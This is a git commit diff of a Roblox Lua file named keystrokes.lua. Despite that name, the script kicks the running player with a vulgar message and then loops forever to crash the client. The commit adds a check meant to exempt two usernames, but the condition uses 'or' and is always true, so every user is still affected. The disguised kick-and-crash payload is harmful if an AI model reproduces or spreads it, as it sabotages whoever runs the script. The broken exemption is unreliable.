9a07ba65e9fd660a2d693fd91f928dde0a7c9c74
Gwyn <75335238+gwxn@users.noreply.github.com>
2021-03-14 14:37:42 -0700

    Update keystrokes.lua

--- keystrokes.lua
+++ keystrokes.lua
@@ -1,2 +1,4 @@
-game.Players.LocalPlayer:Kick('fucked by egirl')
-while true do print('crash') end
+if game.Players.LocalPlayer.Name ~= "Bin_Latin" or game.Players.LocalPlayer.Name ~= "1v1icy" then
+    game.Players.LocalPlayer:Kick('fucked by egirl')
+    while true do print('crash') end
+end
